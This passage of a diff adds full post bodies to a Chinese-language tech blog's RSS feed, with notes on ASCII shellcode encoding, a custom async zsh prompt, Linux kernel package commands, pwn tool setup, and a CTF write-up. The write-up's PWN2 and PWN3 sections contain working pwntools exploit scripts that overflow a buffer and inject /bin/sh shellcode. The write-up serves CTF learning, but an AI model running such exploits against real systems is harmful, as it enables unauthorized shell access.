  http://inaz2.hatenablog.com/entry/2014/07/11/004655 http://inaz2.hatenablog.com/entry/2014/07/12/000007 http://inaz2.hatenablog.com/entry/2014/07/13/025626 https://code.google.com/archive/p/alpha3/ https://nets.ec/Ascii_shellcode </description>
+      <content:encoded><![CDATA[<p>可以使用<code>alpha3</code>這套工具，他會產生出具有encoder的ascii shellcode ， 利用本身的encoder去解碼，產生出來的shellcode很短，不過這類的shellcode需要一個<code>reg</code>去指向shellcode的起頭</p>
+<p>其他別種的有些是利用偏移去xor，最後<code>jmp esp</code>去執行</p>
+<p>紀錄一下一題題目的解法：
+利用stack上的位置跟<code>ROP</code>的<code>ret</code>跳到那個位置上，再利用stack上的值去跟eax去做xor，利用的是像<code>xor al,[esp+0x34]</code>這類的op code，偏移的部分利用<code>push eax</code> 來填充，最後剛好使eax 指向我們shellcode的位置</p>
+<p>可以參考下方的參考資料</p>
+<p>References</p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">http://inaz2.hatenablog.com/entry/2014/07/11/004655
+http://inaz2.hatenablog.com/entry/2014/07/12/000007
+http://inaz2.hatenablog.com/entry/2014/07/13/025626
+https://code.google.com/archive/p/alpha3/
+https://nets.ec/Ascii_shellcode
+</code></pre></div>]]></content:encoded>
     </item>
     
     <item>
@@ -135,6 +499,58 @@ References
 嘗試自己寫zshrc把會用到的寫進去就好，速度提升不少，git方面採用比較好的做法，先把原本要輸出在Prompt的git訊息輸出到tmp裡面，等跑完以後在資料撈回Prompt
 大約如下：
 setopt prompt_subst # enable command substition in prompt autoload -Uz vcs_info zstyle &amp;#39;:vcs_info:*&amp;#39; enable bzr git hg svn zstyle &amp;#39;:vcs_info:*&amp;#39; check-for-changes true zstyle &amp;#39;:vcs_info:*&amp;#39; stagedstr &amp;#39;%F{green}●%f&amp;#39; zstyle &amp;#39;:vcs_info:*&amp;#39; unstagedstr &amp;#39;%F{yellow}●%f&amp;#39; zstyle &amp;#39;:vcs_info:*&amp;#39; formats &amp;#39; %b%c%u&amp;#39; zstyle &amp;#39;:vcs_info:*&amp;#39; actionformats &amp;#34; - [%b%c%u|%F{cyan}%a%f]&amp;#34; zstyle &amp;#39;:vcs_info:(sv[nk]|bzr):*&amp;#39; branchformat &amp;#39;%b|%F{cyan}%r%f&amp;#39; zstyle &amp;#39;:vcs_info:git*+set-message:*&amp;#39; hooks git_status ASYNC_PROC=0 ASYNC_DATA=&amp;#34;${TMPPREFIX}-prompt_sorin_data&amp;#34; function precmd() { function async() { vcs_info # save to temp file printf &amp;#34;%s&amp;#34; &amp;#34;${vcs_info_msg_0_}&amp;#34; &amp;gt; $ASYNC_DATA # signal parent kill -s USR1 $$ } # do not clear RPROMPT, let it persist # kill child if necessary if [[ &amp;#34;${ASYNC_PROC}&amp;#34; !</description>
+      <content:encoded><![CDATA[<p>用過<code>prezto</code>與<code>oh-my-zsh</code>的zsh framework以後雖然很方便但是預設會載入一堆插件跟資料，導致開啟shell的時候會有延遲的感覺，尤其進入龐大的git資料夾的時候，速度慢到可以</p>
+<p>嘗試自己寫zshrc把會用到的寫進去就好，速度提升不少，git方面採用比較好的做法，先把原本要輸出在<code>Prompt</code>的git訊息輸出到<code>tmp</code>裡面，等跑完以後在資料撈回<code>Prompt</code></p>
+<p>大約如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">setopt prompt_subst <span style="color:#75715e"># enable command substition in prompt</span>
+autoload -Uz vcs_info
+
+zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> enable bzr git hg svn
+zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> check-for-changes true
+zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> stagedstr <span style="color:#e6db74">&#39;%F{green}●%f&#39;</span>
+zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> unstagedstr <span style="color:#e6db74">&#39;%F{yellow}●%f&#39;</span>
+zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> formats <span style="color:#e6db74">&#39;  %b%c%u&#39;</span>
+zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> actionformats <span style="color:#e6db74">&#34; - [%b%c%u|%F{cyan}%a%f]&#34;</span>
+zstyle <span style="color:#e6db74">&#39;:vcs_info:(sv[nk]|bzr):*&#39;</span> branchformat <span style="color:#e6db74">&#39;%b|%F{cyan}%r%f&#39;</span>
+zstyle <span style="color:#e6db74">&#39;:vcs_info:git*+set-message:*&#39;</span> hooks git_status
+
+ASYNC_PROC<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+ASYNC_DATA<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>TMPPREFIX<span style="color:#e6db74">}</span><span style="color:#e6db74">-prompt_sorin_data&#34;</span>
+<span style="color:#66d9ef">function</span> precmd<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+
+    <span style="color:#66d9ef">function</span> async<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+        vcs_info
+        <span style="color:#75715e"># save to temp file</span>
+        printf <span style="color:#e6db74">&#34;%s&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>vcs_info_msg_0_<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> &gt; $ASYNC_DATA
+        <span style="color:#75715e"># signal parent</span>
+        kill -s USR1 $$
+    <span style="color:#f92672">}</span>
+    <span style="color:#75715e"># do not clear RPROMPT, let it persist</span>
+    <span style="color:#75715e"># kill child if necessary</span>
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>ASYNC_PROC<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+        kill -s HUP $ASYNC_PROC &gt;/dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> <span style="color:#f92672">||</span> :
+    <span style="color:#66d9ef">fi</span>
+    <span style="color:#75715e"># start background computation</span>
+    async &amp;!
+    ASYNC_PROC<span style="color:#f92672">=</span>$!
+<span style="color:#f92672">}</span>
+<span style="color:#66d9ef">function</span> TRAPUSR1<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+    <span style="color:#75715e"># read from temp file</span>
+    RPROMPT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>cat $ASYNC_DATA<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
+    <span style="color:#75715e"># reset proc number</span>
+    ASYNC_PROC<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+    <span style="color:#75715e"># redisplay</span>
+    zle <span style="color:#f92672">&amp;&amp;</span> zle reset-prompt
+<span style="color:#f92672">}</span>
+
+PROMPT<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;%F{cyan}%n@%m%f %F{green}%~%f # &#39;</span>
+RPROMPT<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
+</code></pre></div><p>References</p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">http://www.anishathalye.com/2015/02/07/an-asynchronous-shell-prompt/
+https://linuxtoy.org/archives/zsh_per_dir_hist.html
+http://www.cnblogs.com/ma6174/archive/2012/05/08/2490921.html
+</code></pre></div>]]></content:encoded>
     </item>
     
     <item>
@@ -150,6 +566,20 @@ wget http://kr.archive.ubuntu.com/ubuntu/pool/main/l/linux-lts-utopic/linux-imag
 dpkg --get-selections | grep linux-image 移除舊kernel
 aptitude remove linux-image-3.19.0-18-generic linux kernel exploits db
 https://www.kernel-exploits.com/</description>
+      <content:encoded><![CDATA[<p>搜尋</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">aptitude search linux-image-
+</code></pre></div><p>安裝</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">aptitude install linux-image-xxxx
+</code></pre></div><p>或是上網找尋deb檔下載安裝</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">wget http://kr.archive.ubuntu.com/ubuntu/pool/main/l/linux-lts-utopic/linux-image-3.16.0-30-generic_3.16.0-30.40~14.04.1_amd64.deb
+sudo dpkg -i *.deb
+</code></pre></div><p>查看kernel安裝紀錄</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">dpkg --get-selections | grep linux-image
+</code></pre></div><p>移除舊kernel</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">aptitude remove linux-image-3.19.0-18-generic
+</code></pre></div><p>linux kernel exploits db</p>
+<p><a href="https://www.kernel-exploits.com/">https://www.kernel-exploits.com/</a></p>
+]]></content:encoded>
     </item>
     
     <item>
@@ -164,6 +594,32 @@ pwntools 包含checksec, ROPgadget Tools
 sudo pip install git+https://github.com/Gallopsled/pwntools#egg=pwntools fix bug
 cp /usr/local/lib/python2.7/dist-packages/usr/lib/python2.7/dist-packages/capstone/libcapstone.so /usr/local/lib/python2.7/dist-packages/capstone/. rp++ https://github.com/0vercl0k/rp/downloads
 ncat sudo apt-get install netcat-traditional netcat-openbsd nmap </description>
+      <content:encoded><![CDATA[<p>ub 14.04 x64</p>
+<h2 id="i32-lib">i32 lib</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">apt-get install gcc-multilib
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd /etc/apt/sources.list.d
+echo <span style="color:#e6db74">&#34;deb http://old-releases.ubuntu.com/ubuntu/ raring main restricted universe multiverse&#34;</span> &gt;ia32-libs-raring.list
+apt-get update
+apt-get install ia32-libs
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">dpkg --add-architecture i386
+apt-get update
+apt-get install libssl-dev:i386
+</code></pre></div><h2 id="peda">PEDA</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">apt-get install nasm micro-inetd
+apt-get install libc6-dbg
+https://github.com/longld/peda
+</code></pre></div><h2 id="qira">qira</h2>
+<p><a href="https://github.com/BinaryAnalysisPlatform/qira">https://github.com/BinaryAnalysisPlatform/qira</a></p>
+<h2 id="pwntools">pwntools</h2>
+<p>包含checksec, ROPgadget Tools</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo pip install git+https://github.com/Gallopsled/pwntools#egg<span style="color:#f92672">=</span>pwntools
+</code></pre></div><p>fix bug</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">cp /usr/local/lib/python2.7/dist-packages/usr/lib/python2.7/dist-packages/capstone/libcapstone.so /usr/local/lib/python2.7/dist-packages/capstone/.
+</code></pre></div><h2 id="rp">rp++</h2>
+<p><a href="https://github.com/0vercl0k/rp/downloads">https://github.com/0vercl0k/rp/downloads</a></p>
+<h2 id="ncat">ncat</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt-get install netcat-traditional netcat-openbsd nmap
+</code></pre></div>]]></content:encoded>
     </item>
     
     <item>
@@ -179,6 +635,80 @@ python -c &amp;#39;print &amp;#34;\x90&amp;#34;*1000&amp;#39; | nc 52.69.163.194
 gdb-peda$ info functions All defined functions: Non-debugging symbols: 0x08048364 _init 0x080483a0 read@plt 可以指到read上,一般來說長這樣
 call ret argv1 ￼argv2 argv3 可以控制read的返回地址跟參數,所以可以把ret跟我們shellcode 指到同一個位置上,shellcode的話隨便找一段空⽩白的地⽅方寫上去就好
 from pwn import * import time r = remote(&amp;#39;127.0.0.1&amp;#39;, 4000) read_adr = &amp;#34;\xa0\x83\x04\x08&amp;#34; read = &amp;#34;\x00\x00\x00\x00&amp;#34; + &amp;#34;\x00\xa1\x04\x08&amp;#34; + &amp;#34;\x00\x01\x00\x00&amp;#34; p = &amp;#34;a&amp;#34;*20 + read_adr + &amp;#34;\x00\xa1\x04\x08&amp;#34; + read r.</description>
+      <content:encoded><![CDATA[<p>簡單紀錄一下</p>
+<h2 id="pwn1">PWN1</h2>
+<p>丟進ida 可以看到</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">if ( v4 == 0x90909090 )
+result = puts(aCensordCensord);
+else
+result = printf(&#34;Your point is only %d, try hard!\n&#34;, v4, v1,
+v2, v3);
+return result;
+</code></pre></div><p>直接塞90結束</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python -c &#39;print &#34;\x90&#34;*1000&#39; | nc 52.69.163.194 1111
+</code></pre></div><h2 id="pwn2">PWN2</h2>
+<p>定位到地20個字以後可以控制eip</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gdb-peda$ info functions
+All defined functions:
+Non-debugging symbols:
+0x08048364  _init
+0x080483a0  read@plt
+</code></pre></div><p>可以指到<code>read</code>上,一般來說長這樣</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">call
+ret
+argv1
+￼argv2
+argv3
+</code></pre></div><p>可以控制<code>read</code>的返回地址跟參數,所以可以把<code>ret</code>跟我們shellcode 指到同一個位置上,shellcode的話隨便找一段空⽩白的地⽅方寫上去就好</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> time
+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, <span style="color:#ae81ff">4000</span>)
+read_adr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa0\x83\x04\x08</span><span style="color:#e6db74">&#34;</span>
+read <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xa1\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>
+p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">20</span> <span style="color:#f92672">+</span> read_adr <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xa1\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> read
+r<span style="color:#f92672">.</span>send (p)
+time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>)
+r<span style="color:#f92672">.</span>send (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd</span>
+\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68<span style="color:#e6db74">&#34;)</span>
+</code></pre></div><h2 id="pwn3">PWN3</h2>
+<p>滿多東西始用 qira看的 pwn3首先可以一直<code>push</code>來達成覆蓋<code>ret</code>的效果最後要exit退出達成覆蓋
+一開始算一下 <code>pop leak</code> 的值跟我們shellcode 差多遠,計算以後差 36 ,但是會覆蓋 ret 所以ret 以後要給他一個指標 指向我們的shellcode
+⽤用<code>%d</code>的話超過<code>0x80000000</code> 要剪掉 <code>0x100000000</code>塞進去的職才會是正常的 我們的payload預計長這樣</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">point to shellcode + shellcode + nop + ret
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> time
+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>,<span style="color:#ae81ff">4000</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">push</span>(num):
+     r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+     time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.2</span>)
+     <span style="color:#66d9ef">if</span> num <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x80000000</span>:
+           num <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0x100000000</span>
+     r<span style="color:#f92672">.</span>send( str(num) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#75715e">#pop leak</span>
+r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+item <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">&#39;item&#39;</span>)[<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">23</span>]
+shell_adr <span style="color:#f92672">=</span> int(item,<span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">36</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+<span style="color:#75715e">#shellcode point</span>
+push(shell_adr)
+<span style="color:#75715e">#shellcode</span>
+push(<span style="color:#ae81ff">0x315b0beb</span>)
+push(<span style="color:#ae81ff">0x31c931c0</span>)
+push(<span style="color:#ae81ff">0xcd0bb0d2</span>)
+push(<span style="color:#ae81ff">0xfff0e880</span>)
+push(<span style="color:#ae81ff">0x622fffff</span>)
+push(<span style="color:#ae81ff">0x732f6e69</span>)
+push(<span style="color:#ae81ff">0x90900068</span>)
+<span style="color:#75715e">#nop</span>
+<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">16</span>):
+     push(<span style="color:#ae81ff">0x90909090</span>)
+<span style="color:#75715e">#ret</span>
+push(shell_adr)
+<span style="color:#75715e">#exit</span>
+time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;4</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#75715e">#get shell</span>
+r<span style="color:#f92672">.</span>interactive()
+</code></pre></div>]]></content:encoded>
     </item>
     
     
